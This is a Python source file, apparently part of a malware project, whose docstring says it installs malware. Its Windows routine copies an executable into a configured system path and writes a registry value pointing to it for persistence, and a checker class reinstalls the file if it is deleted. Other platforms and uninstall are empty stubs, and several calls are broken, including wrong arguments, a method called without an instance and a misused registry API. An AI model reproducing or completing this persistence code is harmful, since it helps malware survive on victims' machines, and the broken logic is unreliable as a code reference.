try:
    import winreg
except:
    pass

import os
import sys
from bin.configuration import Settings


class Installer:
    def __init__(self, os_family, ext=None):
        """
        Install malware in system
        :param os_family:
        """
        if os_family == "win32":
            self.install_win32()
        if os_family == "darwin":
            self.install_osx()
        else:
            self.install_linux()

    def install_win32(self, ext):
        """

        :param ext:
        :return:
        """
        os.system(f"COPY .\\{Settings.WINDOWS_APPLICATION_NAME}.exe {Settings.WINDOWS_FULL_PATH}")
        winreg.SetValue(Settings.WINREG_KEY_PATH, Settings.WINDOWS_WINREG_NAME,
                        winreg.REG_QWORD, Settings.WINDOWS_FULL_PATH
                        )

    def install_osx(self):
        """

        :return:
        """
        pass

    def install_linux(self):
        """

        :return:
        """
        pass


class KeeperCheck:
    def __init__(self, os_family):
        """
        Check installation
        :param os_family:
        """
        if os_family == "win32":
            self.check_win32()
        else:
            self.check_unix()

    def check_win32(self):
        if not os.path.exists(f"{Settings.WINDOWS_FULL_PATH}"):
            Installer.install_win32()

    def check_unix(self):
        pass


class Uninstall:
    def __init__(self, os_family):
        """
        Install malware in system
        :param os_family:
        """
        if os_family == "win32":
            self.uninstall_winnt()
        if os_family == "darwin":
            self.uninstall_osx()
        else:
            self.uninstall_linux()

    def uninstall_winnt(self):
        pass

    def uninstall_osx(self):
        pass

    def uninstall_linux(self):
        pass